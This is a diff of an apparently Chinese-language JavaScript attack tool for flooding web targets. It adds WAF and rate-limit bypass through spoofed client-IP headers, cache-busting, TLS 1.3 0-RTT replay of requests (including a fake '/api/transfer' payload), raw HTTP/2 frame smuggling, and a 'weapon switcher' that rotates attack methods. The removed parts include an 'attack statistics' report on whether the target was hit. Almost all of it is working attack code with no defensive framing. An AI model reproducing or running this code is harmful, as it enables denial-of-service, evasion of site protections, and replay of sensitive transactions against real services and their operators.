+        query = PARAM_POLLUTION_TEMPLATES[Math.floor(Math.random() * PARAM_POLLUTION_TEMPLATES.length)](query);
+      }
+      const qs = Array.isArray(query)
+        ? query.map(([k, v]) => `${k}=${encodeURIComponent(v)}`).join('&')
+        : Object.entries(query).map(([k, v]) => `${k}=${encodeURIComponent(v)}`).join('&');
+      return `${apiPath}?${qs}`;
     }
-    
-    const paths = [
-      '/',
-      '/index.html',
-      '/index.php',
-      '/home',
-      '/main',
-      '/api',
-      '/api/v1',
-      '/api/v2',
-      '/wp-admin',
-      '/wp-login.php',
-      '/admin',
-      '/login',
-      '/user',
-      '/profile',
-      '/search',
-      '/api/users',
-      '/api/posts',
-      '/robots.txt',
-      '/sitemap.xml',
-      '/feed',
-      '/rss',
-      '/atom.xml',
-      '/sitemap.html',
-    ];
-    
-    if (Math.random() > 0.3) {
+    if (this.techniques.cacheBypass && Math.random() > 0.5) {
+      return originalPath + CACHE_BYPASS_TECHNIQUES.randomQueryParams();
+    }
+    if (this.techniques.pathRandomization) {
+      const paths = ['/', '/index.html', '/index.php', '/home', '/api', '/api/v1', '/api/v2', '/admin', '/login', '/search', '/robots.txt', '/sitemap.xml'];
       return paths[Math.floor(Math.random() * paths.length)];
     }
     return originalPath;
   }
-  
-  getRandomUserAgent() {
-    return UAs[Math.floor(Math.random() * UAs.length)];
+
+  getRandomUserAgent() { return UAs[Math.floor(Math.random() * UAs.length)]; }
+
+  _generateRateLimitBypassHeaders() {
+    this._rateLimitIPCounter++;
+    const ip = this._generatePseudoRandomIP(this._rateLimitIPCounter);
+    const headers = {};
+    const allHeaders = [
+      ...RATE_LIMIT_BYPASS_HEADERS.standard,
+      ...RATE_LIMIT_BYPASS_HEADERS.cdnSpecific,
+      ...RATE_LIMIT_BYPASS_HEADERS.misc,
+    ];
+    const count = Math.floor(Math.random() * 3) + 2;
+    const shuffled = allHeaders.sort(() => Math.random() - 0.5);
+    for (let i = 0; i < count; i++) {
+      headers[shuffled[i]] = i === 0 ? ip : this._generatePseudoRandomIP(this._rateLimitIPCounter + i * 1000);
+    }
+    return headers;
   }
-  
+
+  _generatePseudoRandomIP(seed) {
+    const a = (seed * 2654435761) >>> 0;
+    return `${(a >>> 24) & 0xFF}.${(a >>> 16) & 0xFF}.${(a >>> 8) & 0xFF}.${a & 0xFF}`;
+  }
+
+  _getWaffledContentType(method) {
+    if (!['POST', 'PUT', 'PATCH'].includes(method)) return null;
+    const types = [
+      { ct: 'application/x-www-form-urlencoded', weight: 0.3 },
+      { ct: 'application/json', weight: 0.3 },
+      { ct: 'multipart/form-data', weight: 0.2 },
+      { ct: 'application/json-patch+json', weight: 0.1 },
+      { ct: 'text/plain', weight: 0.05 },
+      { ct: 'application/xml', weight: 0.05 },
+    ];
+    const rand = Math.random();
+    let cum = 0;
+    for (const t of types) {
+      cum += t.weight;
+      if (rand <= cum) return t.ct;
+    }
+    return types[0].ct;
+  }
+
   getRandomHeaders(method = 'GET') {
     const headerTypes = Object.keys(BYPASS_HEADERS);
     const selectedType = headerTypes[Math.floor(Math.random() * headerTypes.length)];
-    const baseHeaders = { ...BYPASS_HEADERS[selectedType] };
-    
-    if (this.methodSpecificHeaders[method]) {
-      Object.assign(baseHeaders, this.methodSpecificHeaders[method]);
+    const headers = { ...BYPASS_HEADERS[selectedType] };
+
+    if (this.techniques.rateLimitBypass) {
+      Object.assign(headers, this._generateRateLimitBypassHeaders());
     }
-    
-    if (this.enabled && this.techniques.headerVariation) {
-      this.addRandomHeaders(baseHeaders);
-      
-      if (this.techniques.caseVariation && Math.random() > 0.5) {
-        this.randomizeHeaderCase(baseHeaders);
-      }
+    if (this.techniques.cdnHeaderInjection) {
+      Object.assign(headers, this.cdnHeaders);
     }
-    
-    return baseHeaders;
-  }
-  
-  addRandomHeaders(headers) {
-    const randomHeaders = {
-      'X-Forwarded-For': this.generateRandomIP(),
-      'X-Real-IP': this.generateRandomIP(),
-      'X-Client-IP': this.generateRandomIP(),
-      'X-Forwarded-Host': 'www.google.com',
-      'X-Request-ID': crypto.randomBytes(8).toString('hex'),
-      'X-Correlation-ID': crypto.randomBytes(8).toString('hex'),
-      'CF-Connecting-IP': this.generateRandomIP(),
-      'True-Client-IP': this.generateRandomIP(),
-      'X-Originating-IP': this.generateRandomIP(),
-      'X-Remote-IP': this.generateRandomIP(),
-      'X-Remote-Addr': this.generateRandomIP(),
-      'X-Cluster-Client-IP': this.generateRandomIP(),
-      'X-Wap-Profile': 'http://wap.samsungmobile.com/uaprof/SGH-I777.xml',
-      'X-ATT-DeviceId': crypto.randomBytes(8).toString('hex'),
-      'Proxy-Connection': 'keep-alive',
-      'TE': 'Trailers',
-      'DNT': Math.random() > 0.5 ? '1' : '0',
-      'Save-Data': 'on',
-      'Pragma': 'no-cache',
-      'Cache-Control': 'no-cache, no-store, must-revalidate, max-age=0',
-      'Expires': '0',
-      'Via': '1.1 google',
-      'CDN-Loop': 'cloudflare',
-      'X-Cache': 'MISS',
-      'X-Amzn-Trace-Id': `Root=${crypto.randomBytes(8).toString('hex')}`,
-      'X-UIDH': crypto.randomBytes(12).toString('hex'),
-      'X-Request-Start': `t=${Date.now()}`,
-      'X-Csrf-Token': crypto.randomBytes(16).toString('hex'),
-      'X-XSRF-TOKEN': crypto.randomBytes(16).toString('hex'),
-    };
-    
-    const headerKeys = Object.keys(randomHeaders);
-    const numHeaders = Math.floor(Math.random() * 6) + 3;
-    const selectedHeaders = [];
-    
-    for (let i = 0; i < numHeaders; i++) {
-      const randomKey = headerKeys[Math.floor(Math.random() * headerKeys.length)];
-      if (!selectedHeaders.includes(randomKey)) {
-        selectedHeaders.push(randomKey);
-        headers[randomKey] = randomHeaders[randomKey];
-      }
+    if (this.techniques.cacheBypass) {
+      Object.assign(headers, CACHE_BYPASS_TECHNIQUES.cacheControlHeaders());
+      if (Math.random() > 0.5) Object.assign(headers, CACHE_BYPASS_TECHNIQUES.methodOverride());
+      if (Math.random() > 0.3) Object.assign(headers, CACHE_BYPASS_TECHNIQUES.encodingVariation());
     }
-    
-    if (Math.random() > 0.3) {
-      const referers = [
-        'https://www.google.com/',
-        'https://www.bing.com/',
-        'https://www.baidu.com/',
-        'https://www.yahoo.com/',
-        'https://duckduckgo.com/',
-        'https://www.facebook.com/',
-        'https://twitter.com/',
-        'https://www.reddit.com/',
-        'https://github.com/',
-      ];
-      headers['Referer'] = referers[Math.floor(Math.random() * referers.length)];
+    if (this.techniques.waffledMultipart || this.techniques.waffledJSON) {
+      const ct = this._getWaffledContentType(method);
+      if (ct) headers['Content-Type'] = ct;
     }
-    
+    if (this.techniques.caseVariation && Math.random() > 0.4) {
+      const keys = Object.keys(headers);
+      keys.forEach(k => {
+        const newK = k.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
+        if (newK !== k) { headers[newK] = headers[k]; delete headers[k]; }
+      });
+    }
     return headers;
   }
-  
-  randomizeHeaderCase(headers) {
-    const newHeaders = {};
-    for (const [key, value] of Object.entries(headers)) {
-      let newKey = key;
-      if (Math.random() > 0.5) {
-        newKey = key.split('').map(char => 
-          Math.random() > 0.5 ? char.toUpperCase() : char.toLowerCase()
-        ).join('');
-      }
-      newHeaders[newKey] = value;
-    }
-    Object.assign(headers, newHeaders);
-  }
-  
+
   generateRandomCookies() {
+    const names = ['sessionid', 'csrftoken', 'auth_token', 'user_id', 'language', 'theme', 'currency'];
+    const count = Math.floor(Math.random() * 3) + 1;
     const cookies = [];
-    const cookieNames = ['sessionid', 'csrftoken', 'auth_token', 'user_id', 'language', 'theme'];
-    
-    const numCookies = Math.floor(Math.random() * 3) + 1;
-    for (let i = 0; i < numCookies; i++) {
-      const name = cookieNames[Math.floor(Math.random() * cookieNames.length)];
-      const value = crypto.randomBytes(8).toString('hex');
-      cookies.push(`${name}=${value}`);
+    for (let i = 0; i < count; i++) {
+      cookies.push(`${names[Math.floor(Math.random() * names.length)]}=${crypto.randomBytes(8).toString('hex')}`);
     }
-    
     return cookies.join('; ');
   }
-  
-  generateEncodedParams() {
-    const params = {};
-    const paramNames = ['id', 'page', 'search', 'q', 'token', 'key', 'auth', 'uid'];
-    
-    const numParams = Math.floor(Math.random() * 4) + 1;
-    for (let i = 0; i < numParams; i++) {
-      const name = paramNames[Math.floor(Math.random() * paramNames.length)];
-      const value = Math.random() > 0.5 
-        ? crypto.randomBytes(4).toString('hex')
-        : Math.floor(Math.random() * 1000).toString();
-      
-      if (Math.random() > 0.7) {
-        params[name] = encodeURIComponent(value);
-      } else if (Math.random() > 0.5) {
-        params[name] = Buffer.from(value).toString('base64');
-      } else {
-        params[name] = value;
-      }
-    }
-    
-    return params;
+
+  getRateLimitBypassStats() {
+    return { requestsWithUniqueIP: this._rateLimitIPCounter };
   }
-  
-  generateRandomIP() {
-    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+
+  static get MODES() {
+    return { STEALTH: 'stealth', AGGRESSIVE: 'aggressive', WAFFLED: 'waffled', FULL: 'full' };
   }
 }
 
-class EnhancedRandomSpeedController {
-  constructor(multiMethodEnabled = false) {
-    this.minInterval = 1;
-    this.maxInterval = 100;
-    this.currentInterval = this.getRandomInterval();
-    this.lastChangeTime = Date.now();
-    this.changeIntervalRange = { min: 30000, max: 180000 };
-    this.nextChangeTime = this.lastChangeTime + this.getRandomChangeInterval();
-    this.multiMethodEnabled = multiMethodEnabled;
-    this.methodStats = {};
+// ==================== 0-RTT重放攻击引擎 ====================
+class ZeroRTTReplayEngine {
+  constructor(targetHost, targetPort = 443) {
+    this.host = targetHost;
+    this.port = targetPort;
+    this.sessionCache = new Map();
+    this.earlyDataPayloads = [];
+    this.replayStats = { total: 0, accepted: 0, rejected: 0 };
   }
-  
-  getRandomInterval() {
-    return Math.floor(Math.random() * (this.maxInterval - this.minInterval + 1)) + this.minInterval;
-  }
-  
-  getRandomChangeInterval() {
-    return Math.floor(Math.random() * (this.changeIntervalRange.max - this.changeIntervalRange.min + 1)) + this.changeIntervalRange.min;
-  }
-  
-  getCurrentInterval() {
-    const now = Date.now();
-    
-    if (now >= this.nextChangeTime) {
-      this.currentInterval = this.getRandomInterval();
-      this.lastChangeTime = now;
-      this.nextChangeTime = now + this.getRandomChangeInterval();
-      
-      console.log(`\x1b[33m[速度变化]\x1b[37m 新间隔: ${this.currentInterval}ms`.random);
-    }
-    
-    return this.currentInterval;
-  }
-  
-  recordMethodUsage(method) {
-    if (!this.methodStats[method]) {
-      this.methodStats[method] = 0;
-    }
-    this.methodStats[method]++;
-  }
-  
-  getMethodStats() {
-    return this.methodStats;
-  }
-  
-  getSpeedDescription() {
-    const requestsPerSecond = Math.round(1000 / this.currentInterval);
-    return `${requestsPerSecond} 请求/秒 (间隔: ${this.currentInterval}ms)`;
-  }
-}
 
-class MultiMethodAttackManager {
-  constructor(wafBypass, speedController) {
-    this.wafBypass = wafBypass;
-    this.speedController = speedController;
-    this.methodQueue = [];
-    this.maxConcurrentMethods = 3;
-    this.methodStats = {};
+  async establishSession() {
+    return new Promise((resolve, reject) => {
+      const socket = tls.connect({
+        host: this.host, port: this.port,
+        rejectUnauthorized: false,
+        ALPNProtocols: ['h2', 'http/1.1'],
+        minVersion: 'TLSv1.3', maxVersion: 'TLSv1.3',
+        earlyData: false,
+      }, () => {
+        console.log(`  \x1b[32m[+]\x1b[37m TLS 1.3 握手完成`);
+        console.log(`  \x1b[32m[+]\x1b[37m 协议: ${socket.getProtocol()}`);
+        console.log(`  \x1b[32m[+]\x1b[37m 加密套件: ${socket.getCipher().name}`);
+      });
+
+      socket.on('session', (session) => {
+        const sessionId = crypto.randomBytes(8).toString('hex');
+        this.sessionCache.set(sessionId, {
+          ticket: session,
+          establishedAt: Date.now(),
+          alpn: socket.alpnProtocol || 'http/1.1',
+        });
+        console.log(`  \x1b[32m[+]\x1b[37m 捕获会话票据: ${sessionId}`);
+        socket.end();
+        resolve({ sessionId, alpn: socket.alpnProtocol || 'http/1.1' });
+      });
+
+      socket.on('error', (err) => {
+        console.log(`  \x1b[33m[!]\x1b[37m 连接失败: ${err.message}`);
+        reject(err);
+      });
+
+      socket.on('timeout', () => {
+        socket.destroy();
+        reject(new Error('TLS握手超时'));
+      });
+
+      socket.setTimeout(10000);
+      socket.write('HEAD / HTTP/1.1\r\nHost: ' + this.host + '\r\n\r\n');
+    });
   }
-  
-  generateConcurrentMethods(baseMethod = 'GET') {
-    if (!this.wafBypass.techniques.multiMethodAttack) {
-      return [baseMethod];
+
+  prepareEarlyDataPayloads(method = 'POST', path = '/api') {
+    this.earlyDataPayloads = [];
+    this.earlyDataPayloads.push({
+      name: 'API请求重放', method, path,
+      headers: {
+        'Host': this.host,
+        'User-Agent': UAs[Math.floor(Math.random() * UAs.length)],
+        'Content-Type': 'application/json',
+        'Accept': '*/*',
+        'Early-Data': '1',
+      },
+      body: JSON.stringify({
+        action: 'test',
+        id: Math.floor(Math.random() * 10000),
+        timestamp: Date.now(),
+        data: crypto.randomBytes(16).toString('hex'),
+      }),
+      timesToReplay: Math.floor(Math.random() * 3) + 2,
+    });
+    this.earlyDataPayloads.push({
+      name: '敏感操作重放', method: 'POST', path: '/api/transfer',
+      headers: { 'Host': this.host, 'Content-Type': 'application/json', 'Early-Data': '1' },
+      body: JSON.stringify({ from: 'attacker', to: 'attacker2', amount: Math.floor(Math.random() * 1000), transactionId: crypto.randomBytes(4).toString('hex') }),
+      timesToReplay: Math.floor(Math.random() * 2) + 1,
+    });
+    this.earlyDataPayloads.push({
+      name: 'HTTP/2 0-RTT探测', method: 'GET', path: '/',
+      headers: { ':authority': this.host, ':method': 'GET', ':path': '/', ':scheme': 'https', 'user-agent': UAs[Math.floor(Math.random() * UAs.length)], 'early-data': '1' },
+      body: '', timesToReplay: 2, useHTTP2: true,
+    });
+    console.log(`\n\x1b[35m[0-RTT]\x1b[37m 准备了 ${this.earlyDataPayloads.length} 种重放负载`);
+  }
+
+  buildHTTP1EarlyData(payload) {
+    const requestLine = `${payload.method} ${payload.path} HTTP/1.1\r\n`;
+    let headers = '';
+    for (const [key, value] of Object.entries(payload.headers)) {
+      if (!key.startsWith(':')) headers += `${key}: ${value}\r\n`;
     }
-    
-    const methodCount = Math.floor(Math.random() * this.maxConcurrentMethods) + 1;
-    const methods = this.wafBypass.getRandomMethodCombination(methodCount);
-    
-    methods.forEach(method => {
-      if (!this.methodStats[method]) {
-        this.methodStats[method] = 0;
+    headers += `Content-Length: ${Buffer.byteLength(payload.body)}\r\n`;
+    return requestLine + headers + '\r\n' + payload.body;
+  }
+
+  buildHTTP2EarlyDataFrame(payload) {
+    const preface = Buffer.from('505249202a20485454502f322e300d0a0d0a534d0d0a0d0a', 'hex');
+    const settingsFrame = Buffer.from([0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00]);
+    const headersBlock = this._encodeHTTP2Headers(payload.headers, payload.path, payload.method);
+    const streamId = 1;
+    const headersFrame = Buffer.concat([
+      Buffer.from([(headersBlock.length >> 16) & 0xFF, (headersBlock.length >> 8) & 0xFF, headersBlock.length & 0xFF]),
+      Buffer.from([0x01, 0x05, 0x00, 0x00, 0x00, streamId]),
+      headersBlock,
+    ]);
+    return Buffer.concat([preface, settingsFrame, headersFrame]);
+  }
+
+  _encodeHTTP2Headers(headers, path, method) {
+    const encoded = [];
+    encoded.push(0x80 | (method === 'GET' ? 2 : 3));
+    encoded.push(0x40 | 4, ...Buffer.from(path));
+    encoded.push(0x40 | 6, ...Buffer.from('https'));
+    encoded.push(0x40 | 1, ...Buffer.from(headers[':authority'] || this.host));
+    for (const [key, value] of Object.entries(headers)) {
+      if (!key.startsWith(':')) {
+        encoded.push(0x40, ...Buffer.from(key.toLowerCase()), ...Buffer.from(value));
       }
-      this.methodStats[method]++;
-      
-      if (this.speedController) {
-        this.speedController.recordMethodUsage(method);
+    }
+    return Buffer.from(encoded.flat());
+  }
+
+  async executeReplay(sessionId, payload) {
+    const sessionData = this.sessionCache.get(sessionId);
+    if (!sessionData) { console.log(`  \x1b[31m[-]\x1b[37m 会话不存在`); return []; }
+    const results = [];
+    for (let i = 0; i < payload.timesToReplay; i++) {
+      const result = await this._singleReplay(sessionData, payload, i);
+      results.push(result);
+      this.replayStats.total++;
+      if (result.accepted) this.replayStats.accepted++;
+      else this.replayStats.rejected++;
+      await new Promise(r => setTimeout(r, Math.random() * 100 + 50));
+    }
+    return results;
+  }
+
+  _singleReplay(sessionData, payload, replayIndex) {
+    return new Promise((resolve) => {
+      try {
+        const earlyData = payload.useHTTP2 ? this.buildHTTP2EarlyDataFrame(payload) : this.buildHTTP1EarlyData(payload);
+        const socket = tls.connect({
+          host: this.host, port: this.port,
+          rejectUnauthorized: false,
+          session: sessionData.ticket,
+          ALPNProtocols: [sessionData.alpn],
+          minVersion: 'TLSv1.3', maxVersion: 'TLSv1.3',
+          earlyData: true,
+        });
+        socket.on('secureConnect', () => socket.write(earlyData));
+        socket.on('data', (data) => {
+          resolve({ name: payload.name, replayIndex, accepted: socket.earlyDataAccepted !== false, responseReceived: true, timestamp: Date.now() });
+          socket.end();
+        });
+        socket.on('error', (err) => resolve({ name: payload.name, replayIndex, accepted: false, error: err.message }));
+        socket.setTimeout(5000);
+        socket.on('timeout', () => { socket.destroy(); resolve({ name: payload.name, replayIndex, accepted: false, error: 'timeout' }); });
+      } catch (err) {
+        resolve({ name: payload.name, replayIndex, accepted: false, error: 'Frame build error: ' + err.message });
       }
     });
-    
-    return methods;
   }
-  
-  getMethodStats() {
-    return this.methodStats;
+
+  async runFullAttack(method = 'POST', path = '/api') {
+    console.log(`\n\x1b[35m╔══════════════════════════════════════╗\x1b[37m`);
+    console.log(`\x1b[35m║     0-RTT 重放攻击引擎               ║\x1b[37m`);
+    console.log(`\x1b[35m╚══════════════════════════════════════╝\x1b[37m`);
+    try {
+      console.log(`\n\x1b[35m[0-RTT 步骤1]\x1b[37m 建立TLS 1.3会话...`);
+      let sessionData;
+      try {
+        sessionData = await this.establishSession();
+      } catch (err) {
+        console.log(`  \x1b[31m[-]\x1b[37m 无法建立TLS 1.3连接: ${err.message}`);
+        return { success: false, reason: 'TLS 1.3不可用' };
+      }
+      console.log(`\n\x1b[35m[0-RTT 步骤2]\x1b[37m 准备重放负载...`);
+      this.prepareEarlyDataPayloads(method, path);
+      console.log(`\n\x1b[35m[0-RTT 步骤3]\x1b[37m 执行重放攻击...`);
+      const allResults = [];
+      for (const payload of this.earlyDataPayloads) {
+        console.log(`  \x1b[33m[*]\x1b[37m 执行: ${payload.name} (重放${payload.timesToReplay}次)`);
+        try {
+          const results = await this.executeReplay(sessionData.sessionId, payload);
+          allResults.push({ payload: payload.name, results });
+        } catch (replayErr) {
+          console.log(`    \x1b[31m[!]\x1b[37m 执行失败: ${replayErr.message}`);
+          allResults.push({ payload: payload.name, error: replayErr.message });
+        }
+      }
+      console.log(`\n\x1b[35m[0-RTT 统计]\x1b[37m`);
+      console.log(`  总重放: ${this.replayStats.total} | 接受: ${this.replayStats.accepted} | 拒绝: ${this.replayStats.rejected}`);
+      if (this.replayStats.accepted > 0) console.log(`\n  \x1b[31m[!]\x1b[37m ⚠️  目标存在0-RTT重放漏洞！`);
+      else console.log(`\n  \x1b[32m[+]\x1b[37m 目标正确拒绝了所有0-RTT重放`);
+      return { success: this.replayStats.accepted > 0, stats: this.replayStats, results: allResults };
+    } catch (fatalErr) {
+      console.log(`  \x1b[31m[-]\x1b[37m 0-RTT引擎致命错误: ${fatalErr.message}`);
+      return { success: false, reason: fatalErr.message };
+    }
   }
+}
+
+// ==================== 手动 HTTP/2 帧走私执行器 ====================
+const FRAME_TYPES = { DATA: 0x0, HEADERS: 0x1, SETTINGS: 0x4, RST_STREAM: 0x3 };
+const HTTP2_PREFACE = Buffer.from('505249202a20485454502f322e300d0a0d0a534d0d0a0d0a', 'hex');
+
+function encodeHTTP2Headers(headers, method, path, authority) {
+  const buf = [];
+  if (method === 'GET') buf.push(0x80 | 2);
+  else if (method === 'POST') buf.push(0x80 | 3);
+  else if (method === 'OPTIONS') buf.push(0x40 | 1, ...Buffer.from(':method'), ...Buffer.from('OPTIONS'));
+  else buf.push(0x40 | 1, ...Buffer.from(':method'), ...Buffer.from(method));
+  buf.push(0x40 | 4, ...Buffer.from(path));
+  buf.push(0x40 | 6, ...Buffer.from('https'));
+  buf.push(0x40 | 1, ...Buffer.from(authority));
+  for (const [key, value] of Object.entries(headers)) {
+    if (key.startsWith(':')) continue;
+    buf.push(0x40, ...Buffer.from(key.toLowerCase()), ...Buffer.from(value));
+  }
+  return Buffer.from(buf.flat());
+}
+
+function buildSettingsFrame() {
+  return Buffer.from([0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00]);
+}
+
+function buildHeadersFrame(streamId, headersBlock, endStream = false) {
+  const flags = endStream ? 0x05 : 0x04;
+  const frameHeader = Buffer.alloc(9);
+  frameHeader.writeUIntBE(headersBlock.length, 0, 3);
+  frameHeader[3] = FRAME_TYPES.HEADERS;
+  frameHeader[4] = flags;
+  frameHeader.writeInt32BE(streamId, 5);
+  return Buffer.concat([frameHeader, headersBlock]);
+}
+
+function buildDataFrame(streamId, data, endStream = true) {
+  const frameHeader = Buffer.alloc(9);
+  frameHeader.writeUIntBE(data.length, 0, 3);
+  frameHeader[3] = FRAME_TYPES.DATA;
+  frameHeader[4] = endStream ? 0x01 : 0x00;
+  frameHeader.writeInt32BE(streamId, 5);
+  return Buffer.concat([frameHeader, data]);
+}
+
+class H2SmugglingExecutor {
+  constructor(host, port) {
+    this.host = host;
+    this.port = port || 443;
+  }
+
+  executeSmuggling(rawPayload, retries = 0) {
+    return new Promise((resolve) => {
+      const MAX_RETRIES = 1;
+      const socket = tls.connect({
+        host: this.host,
+        port: this.port,
+        rejectUnauthorized: false,
+        ALPNProtocols: ['h2'],
+        minVersion: 'TLSv1.2',
+        maxVersion: 'TLSv1.3',
+      });
+
+      let resolved = false;
+      const safeResolve = (result) => {
+        if (resolved) return;
+        resolved = true;
+        socket.destroy();
+        resolve(result);
+      };
+
+      socket.on('secureConnect', () => {
+        socket.write(HTTP2_PREFACE);
+        socket.write(buildSettingsFrame());
+        const method = rawPayload.method || 'GET';
+        const path = rawPayload.pseudoHeaders[':path'] || '/';
+        const customHeaders = rawPayload.customHeaders || {};
+        if (!customHeaders['user-agent']) {
+          customHeaders['user-agent'] = UAs[Math.floor(Math.random() * UAs.length)];
+        }
+        try {
+          const headersBlock = encodeHTTP2Headers(customHeaders, method, path, this.host);
+          const streamId = 1;
+          const endStream = !rawPayload.body;
+          socket.write(buildHeadersFrame(streamId, headersBlock, endStream));
+          if (rawPayload.body) {
+            socket.write(buildDataFrame(streamId, Buffer.from(rawPayload.body), true));
+          }
+        } catch (err) {
+          safeResolve({ success: false, name: rawPayload.name, error: 'Frame build: ' + err.message });
+        }
+      });
+
+      socket.on('data', () => {
+        safeResolve({ success: true, name: rawPayload.name, status: 'sent (raw h2)' });
+      });
+
+      socket.on('error', (err) => {
+        if (retries < MAX_RETRIES && err.code === 'ECONNRESET') {
+          this.executeSmuggling(rawPayload, retries + 1).then(resolve);
+        } else {
+          safeResolve({ success: false, name: rawPayload.name, error: err.message });
+        }
+      });
+
+      socket.setTimeout(10000);
+      socket.on('timeout', () => {
+        safeResolve({ success: true, name: rawPayload.name, status: 'timeout (possible success)' });
+      });
+    });
+  }
+
+  async runAllPayloads() {
+    console.log(`\n\x1b[35m[H2走私]\x1b[37m 手动构造帧，执行 ${H2_SMUGGLING_PAYLOADS.length} 个负载...`);
+    const results = [];
+    for (const payload of H2_SMUGGLING_PAYLOADS) {
+      payload.pseudoHeaders[':authority'] = this.host;
+      const result = await this.executeSmuggling(payload);
+      results.push(result);
+      console.log(`  \x1b[${result.success ? '32' : '31'}m[${result.success ? '+' : '-'}]\x1b[37m ${payload.name}: ${result.status || result.error || '失败'}`);
+    }
+    const successCount = results.filter(r => r.success).length;
+    console.log(`  \x1b[36m[结果]\x1b[37m ${successCount}/${results.length} 负载发送成功`);
+    return results;
+  }
+}
+
+// ==================== 自动武器切换管理器 ====================
+class AutoWeaponSwitcher {
+  constructor(host, port, availableWeapons) {
+    this.host = host;
+    this.port = port;
+    this.weapons = availableWeapons;
+    this.currentWeapon = 0;
+    this.switchInterval = 30000;
+    this.isRunning = false;
+    this.switchTimer = null;
+  }
+
+  getCurrentWeapon() { return this.weapons[this.currentWeapon % this.weapons.length]; }
+
+  switchToNext() {
+    this.currentWeapon = (this.currentWeapon + 1) % this.weapons.length;
+    const weapon = this.getCurrentWeapon();
+    console.log(`\n\x1b[35m[武器切换]\x1b[37m → ${weapon.name}: ${weapon.description}`);
+    return weapon;
+  }
+
+  startAutoSwitch(onSwitch) {
+    this.isRunning = true;
+    const doSwitch = () => {
+      if (!this.isRunning) return;
+      const weapon = this.switchToNext();
+      if (onSwitch) onSwitch(weapon);
+      this.switchTimer = setTimeout(doSwitch, this.switchInterval);
+    };
+    doSwitch();
+  }
+
+  stop() {
+    this.isRunning = false;
+    if (this.switchTimer) clearTimeout(this.switchTimer);
+  }
+}
+
+// ==================== 辅助类 ====================
+class EnhancedRandomSpeedController {
+  constructor() {
+    this.minInterval = 1; this.maxInterval = 100;
+    this.currentInterval = this.getRandomInterval();
+    this.nextChangeTime = Date.now() + Math.floor(Math.random() * 150000) + 30000;
+  }
+  getRandomInterval() { return Math.floor(Math.random() * 100) + 1; }
+  getCurrentInterval() {
+    if (Date.now() >= this.nextChangeTime) {
+      this.currentInterval = this.getRandomInterval();
+      this.nextChangeTime = Date.now() + Math.floor(Math.random() * 150000) + 30000;
+    }
+    return this.currentInterval;
+  }
+  getSpeedDescription() { return `${Math.round(1000 / this.currentInterval)} 请求/秒`; }
 }
 
 class RandomDurationGenerator {
   static getRandomDuration(minMinutes = 40, maxMinutes = 480) {
-    const minMs = minMinutes * 60 * 1000;
-    const maxMs = maxMinutes * 60 * 1000;
-    return Math.floor(Math.random() * (maxMs - minMs + 1)) + minMs;
+    return Math.floor(Math.random() * (maxMinutes - minMinutes + 1)) * 60 * 1000 + minMinutes * 60 * 1000;
   }
-  
   static formatDuration(ms) {
-    const hours = Math.floor(ms / (1000 * 60 * 60));
-    const minutes = Math.floor((ms % (1000 * 60 * 60)) / (1000 * 60));
-    const seconds = Math.floor((ms % (1000 * 60)) / 1000);
-    
-    if (hours > 0) {
-      return `${hours}小时 ${minutes}分钟 ${seconds}秒`;
-    } else if (minutes > 0) {
-      return `${minutes}分钟 ${seconds}秒`;
-    } else {
-      return `${seconds}秒`;
-    }
+    const hours = Math.floor(ms / 3600000);
+    const minutes = Math.floor((ms % 3600000) / 60000);
+    const seconds = Math.floor((ms % 60000) / 1000);
+    return hours > 0 ? `${hours}h${minutes}m${seconds}s` : minutes > 0 ? `${minutes}m${seconds}s` : `${seconds}s`;
   }
 }
 
-function showFinalStats(totalRequests, failedRequests, startTime, useProxies, proxyCount, wafEnabled, randomSpeedEnabled, interval, requestsPerConnection, methodStats = {}) {
-  const elapsed = (Date.now() - startTime) / 1000;
-  const avgRate = elapsed > 0 ? Math.round(totalRequests / elapsed) : 0;
-  const successRate = totalRequests > 0 ? ((totalRequests - failedRequests) / totalRequests * 100).toFixed(2) : 0;
-  
-  console.log(`
-╔══════════════════════════════════════════════════════════════╗
-║                     攻击统计                                ║
-╚══════════════════════════════════════════════════════════════╝`.stats);
-  
-  console.log(`\x1b[36m[总计]\x1b[37m 总请求数: ${totalRequests}`.info);
-  console.log(`\x1b[36m[失败]\x1b[37m 失败请求: ${failedRequests}`.info);
-  console.log(`\x1b[36m[时间]\x1b[37m 攻击时长: ${elapsed.toFixed(2)} 秒 (${RandomDurationGenerator.formatDuration(elapsed * 1000)})`.info);
-  console.log(`\x1b[36m[速率]\x1b[37m 平均速率: ${avgRate} 请求/秒`.info);
-  console.log(`\x1b[36m[成功率]\x1b[37m ${successRate}%`.info);
-  console.log(`\x1b[36m[模式]\x1b[37m ${useProxies ? '代理攻击 (' + proxyCount + ' 个代理)' : '直接连接'}`.info);
-  console.log(`\x1b[36m[WAF绕过]\x1b[37m ${wafEnabled ? '✅ 已启用' : '❌ 未启用'}`.bypass);
-  console.log(`\x1b[36m[随机速度]\x1b[37m ${randomSpeedEnabled ? '✅ 已启用' : '❌ 未启用'}`.random);
-  console.log(`\x1b[36m[间隔]\x1b[37m ${interval}ms (${Math.round(1000/interval)} 请求/秒)`.info);
-  console.log(`\x1b[36m[连接请求数]\x1b[37m ${requestsPerConnection} 个`.info);
-  console.log(`\x1b[36m[带宽]\x1b[37m 约 ${Math.round(avgRate * 1.5 / 1024)} MB/秒`.info);
-  
-  if (Object.keys(methodStats).length > 0) {
-    console.log(`\x1b[36m[方法统计]\x1b[37m`.method);
-    const sortedMethods = Object.entries(methodStats)
-      .sort(([,a], [,b]) => b - a)
-      .slice(0, 10);
-    
-    sortedMethods.forEach(([method, count]) => {
-      const percentage = ((count / totalRequests) * 100).toFixed(1);
-      console.log(`  ${method}: ${count} (${percentage}%)`.method);
-    });
-  }
-  
-  if (successRate > 90) {
-    console.log('\n\x1b[32m✅ 攻击成功！目标可能已受影响\x1b[37m'.success);
-  } else if (successRate > 50) {
-    console.log('\n\x1b[33m⚠️  攻击部分成功，目标可能承受压力\x1b[37m'.warn);
-  } else {
-    console.log('\n\x1b[31m❌ 攻击效果不佳，目标可能防御较强\x1b[37m'.error);
-  }
-}
-
+// ==================== 参数解析（修复 NaN 问题） ====================
 function parseArguments() {
   const args = {
-    target: null,
-    proxyFile: null,
-    duration: null,
-    threads: null,
-    method: 'GET',
-    waf: false,
-    randomSpeed: false,
